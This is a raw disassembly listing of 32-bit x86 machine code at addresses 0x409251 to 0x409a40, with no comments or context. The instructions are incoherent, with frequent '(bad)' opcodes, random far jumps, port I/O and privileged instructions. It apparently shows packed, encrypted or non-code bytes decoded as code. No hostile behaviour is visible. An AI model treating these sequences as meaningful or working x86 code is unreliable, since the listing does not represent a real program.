  409251:	cmp    DWORD PTR ss:[edx-0x73043a48],ecx
  409258:	fs lahf 
  40925a:	jo     0x4092bc
  40925c:	pop    ebp
  40925d:	dec    esi
  40925e:	add    ebp,DWORD PTR [eax-0x4a301ecb]
  409264:	cmp    cl,bh
  409266:	ret    0x393f
  409269:	mov    bh,0x3e
  40926b:	cmp    ch,BYTE PTR [edi-0x14]
  40926e:	test   eax,0x3d15602
  409273:	xor    eax,0x97205df1
  409278:	sub    BYTE PTR [ecx+eax*2+0x218df7af],0x7a
  409280:	stos   BYTE PTR es:[edi],al
  409281:	sub    BYTE PTR ds:0x4677ef4e,0x8
  409288:	lods   al,BYTE PTR ds:[esi]
  409289:	push   eax
  40928a:	mov    BYTE PTR [eax],dl
  40928c:	mov    ebp,0x7afac86b
  409291:	adc    eax,DWORD PTR [esi-0x38b55186]
  409297:	imul   DWORD PTR [edi+0x5d]
  40929a:	fwait
  40929b:	mov    ah,0x84
  40929d:	lea    eax,[ebp+0x64288b11]
  4092a3:	popf   
  4092a4:	jg     0x4092be
  4092a6:	ins    DWORD PTR es:[edi],dx
  4092a7:	jmp    0x4789:0xf90dca60
  4092ae:	push   ds
  4092af:	adc    DWORD PTR [ebx+0x1],0x71
  4092b3:	pop    esi
  4092b4:	and    eax,0x5d3142a7
  4092b9:	les    esp,FWORD PTR [ebx]
  4092bb:	in     al,0x41
  4092bd:	pop    es
  4092be:	cmp    BYTE PTR [eax+0x4c4a4b34],dl
  4092c4:	mov    ah,0xc8
  4092c6:	icebp  
  4092c7:	xchg   BYTE PTR [ebx],bh
  4092c9:	mov    edi,0x2ada37a
  4092ce:	popa   
  4092cf:	pusha  
  4092d0:	or     edx,DWORD PTR [eax+edx*8+0x687a3cc]
  4092d7:	and    al,0x34
  4092d9:	jbe    0x409276
  4092db:	xor    edi,DWORD PTR [edi-0x5]
  4092de:	aam    0xf2
  4092e0:	and    BYTE PTR [ebp+0x5a],bl
  4092e3:	mov    eax,0x38dd5b93
  4092e8:	cdq    
  4092e9:	sbb    bl,cl
  4092eb:	cmp    eax,0x21f30027
  4092f0:	adc    BYTE PTR [edi+0xd],ch
  4092f3:	lods   eax,DWORD PTR ds:[esi]
  4092f4:	or     BYTE PTR [edi],bh
  4092f6:	push   edx
  4092f7:	sbb    al,BYTE PTR [edi+0x36dcdb56]
  4092fd:	imul   eax,DWORD PTR [esp+edx*2-0x40],0x44
  409302:	stc    
  409303:	cmp    eax,0x442e6c5e
  409308:	(bad)  
  409309:	out    dx,al
  40930a:	sar    edx,1
  40930c:	dec    ebx
  40930d:	ins    BYTE PTR es:[edi],dx
  40930e:	sahf   
  40930f:	xor    BYTE PTR [edi-0x65],bh
  409312:	popa   
  409313:	sub    al,0xa4
  409315:	rcr    cl,1
  409317:	repnz push edi
  409319:	(bad)  
  40931b:	popa   
  40931c:	mov    dh,0x47
  40931e:	mov    edi,0x37741493
  409323:	xor    esi,DWORD PTR [eax]
  409325:	cld    
  409326:	loop   0x40930b
  409328:	fs loopne 0x4092b0
  40932b:	mov    esi,0x4aab51c3
  409330:	fist   DWORD PTR ds:0x8e71b960
  409336:	mov    dl,0x45
  409338:	dec    edx
  409339:	sbb    DWORD PTR [ebp-0x77],esp
  40933c:	fwait
  40933d:	cmp    eax,0x129f2502
  409342:	adc    eax,0x7e33dfe4
  409347:	xlat   BYTE PTR ds:[ebx]
  409348:	fnstenv [ebp-0x7bb2be28]
  40934e:	fucomip st,st(2)
  409350:	xchg   ecx,eax
  409351:	cmp    DWORD PTR [esp+edx*4],esp
  409354:	lea    edx,[esi-0x4f]
  409357:	jecxz  0x409335
  409359:	pushf  
  40935a:	loop   0x409323
  40935c:	xor    BYTE PTR [esi+0xef729fc],0x6c
  409363:	iret   
  409364:	test   al,0xa
  409366:	ds nop
  409368:	mov    ebp,0x6c858786
  40936d:	jp     0x40933f
  40936f:	jge    0x4093b2
  409371:	pop    esp
  409372:	cli    
  409373:	pushf  
  409374:	mov    esp,0x395f22a9
  409379:	jno    0x4093d1
  40937b:	ins    DWORD PTR es:[edi],dx
  40937c:	cld    
  40937d:	sbb    dh,BYTE PTR [ebp+0x6d]
  409380:	std    
  409381:	sar    eax,1
  409383:	sub    eax,0x1515bf74
  409388:	or     ebx,edx
  40938a:	push   ecx
  40938b:	mov    ch,0xbd
  40938d:	mov    al,ds:0x73ae9556
  409392:	outs   dx,BYTE PTR ds:[esi]
  409393:	mov    cl,0x10
  409395:	inc    ebp
  409396:	lea    esp,[eax-0x374337b1]
  40939c:	daa    
  40939d:	dec    edi
  40939e:	xchg   DWORD PTR [edi-0x51],esi
  4093a1:	data16 jne 0x409381
  4093a4:	lds    esp,FWORD PTR [eax]
  4093a6:	test   al,0x41
  4093a8:	mov    ds:0xa11a9db,eax
  4093ad:	ret    
  4093ae:	mov    BYTE PTR [edx-0x2f],bh
  4093b1:	xchg   edx,eax
  4093b2:	inc    edi
  4093b3:	cmp    al,0x62
  4093b5:	or     eax,0x1979ae52
  4093ba:	fsub   QWORD PTR [edx]
  4093bc:	fsubr  DWORD PTR [esi]
  4093be:	or     eax,0x89a0255
  4093c3:	pop    eax
  4093c4:	add    bh,BYTE PTR [eax+esi*2+0x5a3b05f5]
  4093cb:	retf   0x8c98
  4093ce:	ins    BYTE PTR es:[edi],dx
  4093cf:	imul   ebx,DWORD PTR [edi],0x61005bae
  4093d5:	pop    es
  4093d6:	not    DWORD PTR ds:0xfe3a5ac4
  4093dc:	out    0x69,al
  4093de:	mov    esp,0x7c01e1e5
  4093e3:	clc    
  4093e4:	outs   dx,DWORD PTR ds:[esi]
  4093e5:	push   esi
  4093e6:	xor    bh,BYTE PTR [ebx-0x43ca40b9]
  4093ec:	sub    BYTE PTR [edx+0x56a27fa],cl
  4093f2:	arpl   WORD PTR [edx+eax*2+0x24afa765],cx
  4093f9:	je     0x4093dc
  4093fb:	lahf   
  4093fc:	push   edi
  4093fd:	and    BYTE PTR [eax+0x4ac6128],bl
  409403:	jmp    0x409465
  409405:	push   ebp
  409406:	mov    edi,0xb714b39e
  40940b:	xor    DWORD PTR [eax+0x41d31cc2],edx
  409411:	inc    eax
  409412:	add    edi,DWORD PTR [edi-0x1b]
  409415:	add    al,0x4c
  409417:	push   edx
  409418:	call   0xfcb6d6d
  40941d:	fbstp  TBYTE PTR ss:[edx+0xd]
  409421:	les    edx,FWORD PTR [ebx-0x257042b2]
  409427:	mov    ecx,0x6a60fa64
  40942c:	ror    BYTE PTR es:[eax+0x7646b330],1
  409433:	inc    edi
  409434:	mov    DWORD PTR [eax],esi
  409436:	jnp    0x4093db
  409438:	aas    
  409439:	bound  ecx,QWORD PTR [ebx+0x24]
  40943c:	and    edx,DWORD PTR [esi+0x1217f5d2]
  409442:	fwait
  409443:	xlat   BYTE PTR ds:[ebx]
  409444:	dec    edx
  409445:	or     DWORD PTR [ebp+0xa],ebp
  409448:	gs lahf 
  40944a:	call   0xb01a:0xf90a5e67
  409451:	popa   
  409452:	pandn  mm6,QWORD PTR [esi]
  409455:	jle    0x409436
  409457:	retf   
  409458:	pop    esp
  409459:	jb     0x409460
  40945b:	popa   
  40945c:	addr16 mov ebx,edi
  40945f:	loop   0x40948a
  409461:	jg     0x409459
  409463:	mov    BYTE PTR [edx-0x7],ah
  409466:	mov    esi,DWORD PTR [eax+0x36]
  409469:	jo     0x4094cd
  40946b:	add    eax,0x23b4517c
  409470:	mov    edx,DWORD PTR [ebp+0x5c21dacd]
  409476:	jns    0x409466
  409478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409479:	inc    esp
  40947a:	add    edx,esi
  40947c:	inc    esp
  40947d:	adc    DWORD PTR [esp+ebp*1],esi
  409480:	mov    esi,0x726fc61a
  409485:	(bad)  
  409486:	ds jmp 0xbdea69fb
  40948c:	mov    dh,0x8c
  40948e:	cmc    
  40948f:	loopne 0x409413
  409491:	iret   
  409492:	sbb    al,0x87
  409494:	dec    edi
  409495:	pop    ebx
  409496:	clc    
  409497:	fiadd  DWORD PTR [ebx+0x4b756504]
  40949d:	sbb    BYTE PTR [ebx+edx*2+0x610c08],ah
  4094a4:	inc    ebx
  4094a5:	mov    ecx,edi
  4094a7:	lods   eax,DWORD PTR ds:[esi]
  4094a8:	data16 or BYTE PTR [ebx+eax*1-0x7f],dl
  4094ad:	lods   eax,DWORD PTR ds:[esi]
  4094ae:	test   DWORD PTR [ebp+eax*2-0x7f],ecx
  4094b2:	cdq    
  4094b3:	push   edx
  4094b4:	daa    
  4094b5:	dec    ebp
  4094b6:	retf   
  4094b7:	or     dl,BYTE PTR [ecx+0x7c24fea2]
  4094bd:	inc    edi
  4094be:	sub    DWORD PTR [esi],0x5f
  4094c1:	mov    ds:0xf3521d0f,al
  4094c6:	xchg   esi,eax
  4094c7:	mov    al,ds:0xc7760727
  4094cc:	mov    ch,BYTE PTR [ebp+0x51d730bd]
  4094d2:	push   ebx
  4094d3:	sbb    bh,BYTE PTR [ebp+0x7f]
  4094d6:	test   eax,0x3b86ccc6
  4094db:	les    esi,FWORD PTR [edi]
  4094dd:	pusha  
  4094de:	outs   dx,DWORD PTR ds:[esi]
  4094df:	jg     0x409539
  4094e1:	jae    0x4094ca
  4094e3:	mov    ch,dl
  4094e5:	dec    edx
  4094e6:	adc    al,0xe6
  4094e8:	adc    eax,0x5e5dc476
  4094ed:	shl    BYTE PTR [edi+0x31],0xd3
  4094f1:	sbb    ah,BYTE PTR [edx-0x5ad098bd]
  4094f7:	popa   
  4094f8:	adc    edi,esi
  4094fa:	xchg   esi,eax
  4094fb:	mov    esi,0x9e53bd4f
  409500:	rol    ecx,1
  409502:	sub    al,0xd
  409504:	pushf  
  409505:	mov    ds:0x66463141,eax
  40950a:	fdiv   DWORD PTR [ebp+ebp*8+0x17]
  40950e:	push   cs
  40950f:	pop    ebp
  409510:	sub    DWORD PTR [eax+0x68d0bcc8],esp
  409516:	scas   al,BYTE PTR es:[edi]
  409517:	dec    edi
  409518:	sub    dh,bh
  40951a:	xor    DWORD PTR es:[edx+0x6815a619],esp
  409521:	inc    esi
  409522:	xchg   edx,eax
  409523:	adc    esp,DWORD PTR ds:0x6e4e44ed
  409529:	inc    eax
  40952a:	aad    0x92
  40952c:	pushf  
  40952d:	test   DWORD PTR [ebx+0x1ce4f3a6],0xf6a9a9de
  409537:	inc    eax
  409538:	push   0x10a48983
  40953d:	iret   
  40953e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40953f:	mov    edx,0x6ef9b73d
  409544:	inc    edi
  409545:	lds    edx,FWORD PTR [edi+0x29]
  409548:	bound  edi,QWORD PTR [edi+0x2f]
  40954b:	pop    edx
  40954c:	stos   BYTE PTR es:[edi],al
  40954d:	(bad)  
  40954e:	pop    edi
  40954f:	jp     0x409544
  409551:	mov    ch,0xdc
  409553:	scas   al,BYTE PTR es:[edi]
  409554:	xchg   ebx,eax
  409555:	xchg   esp,esi
  409557:	jns    0x409534
  409559:	fild   QWORD PTR [edi+eiz*4-0x4d02240]
  409560:	lods   al,BYTE PTR ds:[esi]
  409561:	mov    bh,0xcc
  409563:	into   
  409564:	stc    
  409565:	dec    edx
  409566:	pop    ebp
  409567:	mov    ch,0x50
  409569:	and    BYTE PTR [edi-0x3b6f95ee],dl
  40956f:	mov    edx,0x2d640b91
  409574:	loop   0x4095a6
  409576:	cmp    DWORD PTR [ebx+0x4bb4aa83],ebp
  40957c:	shl    DWORD PTR [ebx-0x3],1
  40957f:	outs   dx,BYTE PTR ds:[esi]
  409580:	imul   ecx,DWORD PTR [ecx],0x7d83ecac
  409586:	mov    ah,0x15
  409588:	cli    
  409589:	jl     0x409601
  40958b:	int3   
  40958c:	jno    0x409585
  40958e:	cmc    
  40958f:	pop    ebp
  409590:	sbb    ch,BYTE PTR [ecx+edx*8]
  409593:	stos   BYTE PTR es:[edi],al
  409594:	outs   dx,BYTE PTR ds:[esi]
  409595:	push   ds
  409596:	loop   0x409557
  409598:	mov    bl,0xea
  40959a:	mov    eax,0x79fb09d7
  40959f:	(bad)  
  4095a1:	in     al,dx
  4095a2:	jmp    0x409543
  4095a4:	bound  edx,QWORD PTR [esi-0x38]
  4095a7:	mov    edi,0x4417031f
  4095ac:	cmp    BYTE PTR ds:0x8e883305,0xd1
  4095b3:	push   0x1d243657
  4095b8:	pop    esp
  4095b9:	xchg   ebp,edx
  4095bb:	or     DWORD PTR [edi],ebx
  4095bd:	fdiv   DWORD PTR [eax+ebx*2]
  4095c0:	add    dl,BYTE PTR [edi]
  4095c2:	pop    es
  4095c3:	or     DWORD PTR [ebx-0x5],edx
  4095c6:	lea    ebp,[ebx-0x63]
  4095c9:	and    DWORD PTR [ecx-0x20881f77],eax
  4095cf:	cli    
  4095d0:	(bad)  
  4095d1:	enter  0x24eb,0x79
  4095d5:	clc    
  4095d6:	jo     0x409619
  4095d8:	mov    ah,0xa
  4095da:	loopne 0x4095a5
  4095dc:	add    BYTE PTR [edx],al
  4095de:	lds    esi,FWORD PTR [ebx+0x3f]
  4095e1:	aad    0xaf
  4095e3:	cmp    al,0x7e
  4095e5:	fst    DWORD PTR [esi+esi*8+0x7b]
  4095e9:	lahf   
  4095ea:	jo     0x4095c0
  4095ec:	pop    es
  4095ed:	loopne 0x4095be
  4095ef:	mov    esp,0xbe46548
  4095f4:	xor    ebx,edi
  4095f6:	inc    esi
  4095f7:	(bad)  
  4095f8:	sbb    BYTE PTR [edx-0x69],bh
  4095fb:	push   ebp
  4095fc:	jne    0x4095f0
  4095fe:	inc    ebx
  4095ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409600:	sbb    BYTE PTR [ecx-0x6f125e3d],ch
  409606:	mov    edi,0x9443b213
  40960b:	cdq    
  40960c:	and    ecx,ecx
  40960e:	int    0x9e
  409610:	into   
  409611:	xchg   ebx,eax
  409612:	inc    ebp
  409613:	cmp    DWORD PTR [esi+0x6c983b8],ecx
  409619:	ins    DWORD PTR es:[edi],dx
  40961a:	je     0x409659
  40961c:	jae    0x40968c
  40961e:	mov    DWORD PTR [eax],0x2bc25f5e
  409624:	stos   BYTE PTR es:[edi],al
  409625:	adc    al,0xd0
  409627:	push   eax
  409628:	pusha  
  409629:	xchg   esp,eax
  40962a:	push   ebx
  40962b:	adc    cl,cl
  40962d:	push   es
  40962e:	push   eax
  40962f:	add    ebp,DWORD PTR [edi-0x60]
  409632:	jnp    0x409690
  409634:	lock or al,0xa7
  409637:	adc    eax,0x4922c9fb
  40963c:	(bad)  
  40963d:	sar    BYTE PTR [esi],1
  40963f:	out    0x61,al
  409641:	mov    ebp,DWORD PTR [eax-0xc]
  409644:	mov    al,0x54
  409646:	dec    ebx
  409647:	mov    eax,ds:0xc43244f4
  40964c:	pop    ebx
  40964d:	sbb    ch,al
  40964f:	cwde   
  409650:	lock sub DWORD PTR [edx],ebp
  409653:	fiadd  DWORD PTR [ecx-0x5]
  409656:	daa    
  409657:	sub    al,0x9
  409659:	or     BYTE PTR [edx+0x8],dh
  40965c:	imul   eax,edi,0x45
  40965f:	adc    ecx,edx
  409661:	dec    ebx
  409662:	push   ds
  409663:	cwde   
  409664:	or     ch,BYTE PTR [edi-0x5f]
  409667:	cwde   
  409668:	cdq    
  409669:	(bad)  
  40966a:	mov    WORD PTR ds:0x5c1555ac,ds
  409670:	inc    esi
  409671:	test   edi,0x1c1492f0
  409677:	push   ds
  409678:	mov    ch,0x32
  40967a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40967b:	pop    es
  40967c:	repnz cdq 
  40967e:	jmp    0xa2f:0x640ad5e2
  409685:	and    ebx,ebx
  409687:	pop    ebp
  409688:	xor    eax,0x52ffffb2
  40968d:	enter  0x1105,0x15
  409691:	aas    
  409692:	pop    ds
  409693:	out    0xd9,eax
  409695:	rcr    BYTE PTR [edi+0x34],0xec
  409699:	inc    ebp
  40969a:	push   esp
  40969b:	rcl    dl,0xa1
  40969e:	push   ss
  40969f:	mov    WORD PTR [edi-0x3f],es
  4096a2:	out    0x1b,al
  4096a4:	fbld   TBYTE PTR ss:[edx-0x1885edee]
  4096ab:	jnp    0x40964d
  4096ad:	xchg   esi,eax
  4096ae:	mov    sp,0x74e
  4096b2:	in     al,dx
  4096b3:	xor    BYTE PTR [ebp-0x22],dh
  4096b6:	sub    DWORD PTR [esi],0x61203e8a
  4096bc:	dec    edx
  4096bd:	and    DWORD PTR [eax-0x61],0xffffff9f
  4096c1:	xor    edi,esp
  4096c3:	leave  
  4096c4:	fist   DWORD PTR [esi+0x65aeba0b]
  4096ca:	sti    
  4096cb:	jp     0x409657
  4096cd:	inc    esp
  4096ce:	pop    ebx
  4096cf:	and    BYTE PTR [eax+0x1e1c4710],bl
  4096d5:	push   0x70
  4096d7:	imul   esp,DWORD PTR [ebp-0x10],0x4a
  4096db:	mov    ds:0x4dbb0c04,al
  4096e0:	xchg   ecx,eax
  4096e1:	int    0x83
  4096e3:	stos   BYTE PTR es:[edi],al
  4096e4:	mov    eax,ds:0xb639e9e9
  4096e9:	fbld   TBYTE PTR [ebx+0x78]
  4096ec:	and    bh,ah
  4096ee:	mov    edi,0xc82c8095
  4096f3:	jne    0x4096f7
  4096f5:	out    dx,al
  4096f6:	clc    
  4096f7:	push   esi
  4096f8:	cs push ebx
  4096fa:	in     eax,0x68
  4096fc:	sbb    DWORD PTR [ecx+0x30],edx
  4096ff:	sbb    al,0x83
  409701:	pop    ebp
  409702:	and    BYTE PTR [eax],bh
  409704:	jbe    0x40968f
  409706:	ficomp WORD PTR [ecx]
  409708:	(bad)  
  409709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40970a:	(bad)  
  40970b:	and    al,0x81
  40970d:	jae    0x409713
  40970f:	sbb    ebp,ecx
  409711:	inc    edx
  409712:	push   ecx
  409713:	dec    esp
  409714:	inc    eax
  409715:	adc    ebx,DWORD PTR [edx+ebp*4+0x3978e300]
  40971c:	jae    0x4096aa
  40971e:	aad    0xe
  409720:	jp     0x40972b
  409722:	and    ah,BYTE PTR [ebx-0x32fa3116]
  409728:	add    cl,BYTE PTR [esi+0x41]
  40972b:	je     0x409787
  40972d:	sub    eax,0x53397bbf
  409732:	ret    0x9117
  409735:	cli    
  409736:	or     eax,DWORD PTR [edi-0x39924e34]
  40973c:	fild   DWORD PTR [esi+0x448089a0]
  409742:	aam    0xf1
  409744:	jg     0x409731
  409746:	jmp    0x409776
  409748:	les    edi,FWORD PTR [esi-0x60]
  40974b:	jecxz  0x4097c5
  40974d:	inc    ebp
  40974e:	pop    ecx
  40974f:	enter  0xfae7,0xd
  409753:	add    ecx,edi
  409755:	and    BYTE PTR [ecx],al
  409757:	push   0x51aec05
  40975c:	test   al,0x38
  40975e:	je     0x4096f8
  409760:	sbb    DWORD PTR [esi],esp
  409762:	popa   
  409763:	dec    eax
  409764:	cmp    ebx,edi
  409766:	mov    esp,0xdbf6076c
  40976b:	pop    eax
  40976c:	xchg   ebp,eax
  40976d:	xchg   BYTE PTR [ecx+0x66],ch
  409770:	inc    esi
  409771:	jg     0x40975d
  409773:	jge    0x4097ba
  409775:	push   ds
  409776:	mov    dl,0x84
  409778:	jno    0x4097cd
  40977a:	call   0x36008a06
  40977f:	push   ebx
  409780:	inc    ecx
  409781:	(bad)  
  409782:	push   edi
  409783:	ret    
  409784:	test   ebp,ebx
  409786:	jno    0x4097d1
  409788:	adc    al,0x62
  40978a:	in     al,0x7b
  40978c:	mov    eax,0xf86a6df9
  409791:	or     al,0xd0
  409793:	repz jp 0x409725
  409796:	jmp    0x409785
  409798:	das    
  409799:	xchg   esp,eax
  40979a:	daa    
  40979b:	xchg   ebx,eax
  40979c:	mov    esp,0xa9646ea
  4097a1:	xor    ecx,esi
  4097a3:	loope  0x4097a5
  4097a5:	push   ebx
  4097a6:	ret    0x2390
  4097a9:	icebp  
  4097aa:	cmp    bh,dl
  4097ac:	iret   
  4097ad:	jb     0x4097c7
  4097af:	push   edx
  4097b0:	cvtdq2ps xmm2,XMMWORD PTR [edi]
  4097b3:	cld    
  4097b4:	outs   dx,DWORD PTR ds:[esi]
  4097b5:	jbe    0x4097a5
  4097b7:	ffreep st(6)
  4097b9:	cmp    BYTE PTR [edi],ah
  4097bb:	xor    eax,0x1591b87b
  4097c0:	jns    0x4097ce
  4097c2:	mov    dl,BYTE PTR [ebx+0x45]
  4097c5:	loope  0x4097cf
  4097c7:	cwde   
  4097c8:	(bad)  
  4097c9:	aam    0x8c
  4097cb:	in     eax,0xb2
  4097cd:	in     eax,0x53
  4097cf:	ja     0x4097a2
  4097d1:	jge    0x409760
  4097d3:	push   ebx
  4097d4:	mov    ebx,0xdd61dc09
  4097d9:	repnz inc ebp
  4097db:	test   DWORD PTR [esi],edx
  4097dd:	sbb    al,0x95
  4097df:	hlt    
  4097e0:	sub    ch,bl
  4097e2:	adc    esi,esp
  4097e4:	or     ebx,edi
  4097e6:	push   eax
  4097e7:	mov    BYTE PTR [ebx],al
  4097e9:	mov    al,0xf7
  4097eb:	pop    edi
  4097ec:	push   ebx
  4097ed:	stos   DWORD PTR es:[edi],eax
  4097ee:	lea    ecx,[edi]
  4097f0:	mov    al,0xd4
  4097f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f3:	push   ebp
  4097f4:	xlat   BYTE PTR ds:[ebx]
  4097f5:	es imul edx,edi,0x4524ac58
  4097fc:	xchg   ebx,eax
  4097fd:	stos   DWORD PTR es:[edi],eax
  4097fe:	sahf   
  4097ff:	hlt    
  409800:	or     al,bh
  409802:	jno    0x4097c2
  409804:	mov    ds:0x827d0a1a,eax
  409809:	lds    ebx,FWORD PTR [ebx-0x5f]
  40980c:	add    DWORD PTR [edx+esi*1-0x779ac46c],ebp
  409813:	rcr    esp,cl
  409815:	push   0xffffff9c
  409817:	stc    
  409818:	jnp    0x409829
  40981a:	cwde   
  40981b:	push   0x7b63758d
  409820:	mov    ch,0xc7
  409822:	xchg   edi,eax
  409823:	outs   dx,DWORD PTR ds:[esi]
  409824:	push   esp
  409825:	call   0x60a3d12e
  40982a:	stc    
  40982b:	and    ecx,DWORD PTR [ebx+edx*2+0x18f6d0f2]
  409832:	mov    ecx,0xe5b5e2f2
  409837:	stos   DWORD PTR es:[edi],eax
  409838:	sub    BYTE PTR [ebx-0x51],al
  40983b:	xchg   edx,eax
  40983c:	loope  0x4097e8
  40983e:	test   al,0x4b
  409840:	jmp    0x409875
  409842:	lock mov BYTE PTR [edi],dl
  409845:	and    cl,BYTE PTR [edx]
  409847:	in     al,0x12
  409849:	and    al,al
  40984b:	int3   
  40984c:	mov    ebp,0x4edb436a
  409851:	pop    esp
  409852:	add    DWORD PTR [ebx-0x68],edi
  409855:	icebp  
  409856:	retf   0x5def
  409859:	xchg   esi,eax
  40985a:	adc    al,0x56
  40985c:	or     ebp,DWORD PTR [eax-0x5c98386d]
  409862:	mov    esp,0x801b38ae
  409867:	jge    0x409831
  409869:	ins    DWORD PTR es:[edi],dx
  40986a:	dec    ecx
  40986b:	mov    ebp,DWORD PTR [edx+0x6c23237a]
  409871:	ret    0x3c25
  409874:	shl    BYTE PTR [esi-0x7926224e],0xa4
  40987b:	push   ds
  40987c:	adc    al,0xf6
  40987e:	or     eax,0x474fa435
  409883:	xchg   ebp,eax
  409884:	(bad)  
  409885:	stos   BYTE PTR es:[edi],al
  409886:	mov    BYTE PTR [esi+0x43],ah
  409889:	mov    eax,fs:0x70d78764
  40988f:	sbb    DWORD PTR [esi-0x3c69e77b],0xf
  409896:	push   es
  409897:	mov    bl,0x9c
  409899:	push   ebx
  40989a:	hlt    
  40989b:	mov    ebp,DWORD PTR [ebx+0x25747f68]
  4098a1:	cmc    
  4098a2:	int3   
  4098a3:	xor    eax,0xf53826ef
  4098a8:	mov    eax,edx
  4098aa:	sbb    edi,DWORD PTR [ebp+ecx*8+0x16]
  4098ae:	cmp    bh,bl
  4098b0:	aam    0xa5
  4098b2:	rol    DWORD PTR [esi+eiz*4-0x68e178ef],1
  4098b9:	xlat   BYTE PTR ds:[ebx]
  4098ba:	xchg   esi,eax
  4098bb:	xchg   al,bl
  4098bd:	out    0x88,eax
  4098bf:	fnsave [esi+0x1a]
  4098c2:	cmp    eax,0x40f97757
  4098c7:	pushf  
  4098c8:	pop    edx
  4098c9:	gs fwait
  4098cb:	xor    BYTE PTR [ebx-0x57],cl
  4098ce:	adc    al,0x79
  4098d0:	mov    es,WORD PTR [ebx-0x72237a3e]
  4098d6:	neg    BYTE PTR [ebx-0x125c7715]
  4098dc:	sbb    ecx,ebp
  4098de:	int    0x29
  4098e0:	call   0x567b9650
  4098e5:	and    DWORD PTR [edi-0x5ec63ccf],ebx
  4098eb:	pop    ebx
  4098ec:	inc    di
  4098ee:	clc    
  4098ef:	pop    esp
  4098f0:	das    
  4098f1:	mov    DWORD PTR es:[edx+ebx*4-0x21],ecx
  4098f6:	div    BYTE PTR [ebx-0x6b0d9208]
  4098fc:	jmp    0x409939
  4098fe:	dec    esp
  4098ff:	pop    edi
  409900:	nop
  409901:	out    dx,al
  409902:	sub    ebx,DWORD PTR ds:0x151f99ef
  409908:	icebp  
  409909:	call   0x5b9ac1d
  40990e:	lds    edi,FWORD PTR [esi]
  409910:	enter  0x579f,0xb7
  409914:	adc    esp,esi
  409916:	mov    BYTE PTR ds:0x3429982c,ah
  40991c:	popa   
  40991d:	xchg   ebx,eax
  40991e:	out    0xb2,eax
  409920:	push   ecx
  409921:	xor    edx,esp
  409923:	(bad)  
  409924:	push   ebx
  409925:	mov    esi,0x52692256
  40992a:	adc    DWORD PTR [esi-0x5a1b3385],esi
  409930:	fs adc al,0x47
  409933:	sbb    edi,DWORD PTR [ebx]
  409935:	inc    eax
  409936:	inc    ebp
  409937:	inc    ecx
  409938:	adc    DWORD PTR [edx-0x7d7c5663],ebp
  40993e:	add    DWORD PTR [esi-0x6f],0xffffffa6
  409942:	sbb    ah,BYTE PTR [ebx]
  409944:	(bad)  
  409945:	scas   al,BYTE PTR es:[edi]
  409946:	and    bh,cl
  409948:	pop    esi
  409949:	fisubr WORD PTR [esi-0x39]
  40994c:	inc    esp
  40994d:	add    ebp,esi
  40994f:	lods   eax,DWORD PTR ds:[esi]
  409950:	xchg   ecx,eax
  409951:	push   0x4a
  409953:	es inc eax
  409955:	dec    ebx
  409956:	mov    esp,0x270378f
  40995b:	int3   
  40995c:	jg     0x4098fa
  40995e:	lock loopne 0x409936
  409961:	mov    ah,0xee
  409963:	clc    
  409964:	pop    ebp
  409965:	mov    cl,0xa1
  409967:	fisub  DWORD PTR [edx+0x201d6516]
  40996d:	push   eax
  40996e:	je     0x409991
  409970:	repz push es
  409972:	sbb    ch,BYTE PTR [edx+0x3d]
  409975:	jns    0x4099a4
  409977:	idiv   BYTE PTR [ecx+0x2955955]
  40997d:	or     DWORD PTR [ecx-0x5250829e],ebp
  409983:	jp     0x4099a3
  409985:	test   eax,0x43fa2ce1
  40998a:	push   0x88e58033
  40998f:	dec    edx
  409990:	inc    edx
  409991:	jbe    0x4099e9
  409993:	fsub   QWORD PTR [ebx+ecx*4]
  409996:	pop    ebp
  409997:	dec    edi
  409998:	addr16 std 
  40999a:	mov    ebx,0xd9b26420
  40999f:	test   DWORD PTR [ecx+0x5e],edi
  4099a2:	xchg   edx,eax
  4099a3:	(bad)  
  4099a4:	ret    0x174
  4099a7:	sbb    al,dl
  4099a9:	xchg   BYTE PTR [eax-0x6b],bl
  4099ac:	mov    ebp,DWORD PTR [edi+0x2d2f0df7]
  4099b2:	xor    edi,DWORD PTR [ecx]
  4099b4:	clc    
  4099b5:	inc    esi
  4099b6:	retf   
  4099b7:	pop    esp
  4099b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b9:	sbb    esp,ebx
  4099bb:	test   BYTE PTR [esi+edx*8-0x79],ah
  4099bf:	add    al,0x59
  4099c1:	add    eax,0x4757d27c
  4099c6:	push   es
  4099c7:	push   ecx
  4099c8:	cmp    DWORD PTR [edi-0xb],eax
  4099cb:	sub    ch,ch
  4099cd:	mov    ss,esp
  4099cf:	and    eax,0xedcafcdb
  4099d4:	imul   eax,DWORD PTR [esi],0xffffffd6
  4099d7:	fwait
  4099d8:	add    al,0xcb
  4099da:	sbb    ch,BYTE PTR [ebx]
  4099dc:	call   0x57cae8d7
  4099e1:	xchg   ebx,eax
  4099e2:	sub    al,0xb9
  4099e4:	fstp   QWORD PTR [esi+edi*8]
  4099e7:	or     eax,0xe28afc6d
  4099ec:	repnz (bad) 
  4099ef:	mov    bl,0xce
  4099f1:	out    0xf5,al
  4099f3:	dec    ebx
  4099f4:	cli    
  4099f5:	sbb    cl,BYTE PTR [esi+0x1f7eec82]
  4099fb:	outs   dx,DWORD PTR ds:[esi]
  4099fc:	hlt    
  4099fd:	test   DWORD PTR [ebx-0x771a3c11],esi
  409a03:	mov    esp,0xf8a721b4
  409a08:	or     al,0xda
  409a0a:	idiv   BYTE PTR [ebx+0x55975127]
  409a10:	shr    BYTE PTR [esp+edi*1],0x31
  409a14:	cmp    eax,0x68128559
  409a19:	jecxz  0x409a33
  409a1b:	and    eax,0xc818f766
  409a20:	outs   dx,BYTE PTR ds:[esi]
  409a21:	sub    eax,0xf2663a97
  409a26:	push   ebp
  409a27:	bound  edx,QWORD PTR [edx+0x35246dbe]
  409a2d:	in     eax,0xaf
  409a2f:	mov    ch,0x46
  409a31:	stos   BYTE PTR es:[edi],al
  409a32:	push   ebx
  409a33:	(bad)  
  409a34:	neg    BYTE PTR [eax+0x49]
  409a37:	or     al,0x43
  409a39:	in     al,dx
  409a3a:	pop    eax
  409a3b:	inc    esp
  409a3c:	jge    0x4099fd
  409a3e:	inc    ebx
  409a3f:	aaa    
  409a40:	jns    0x409a28
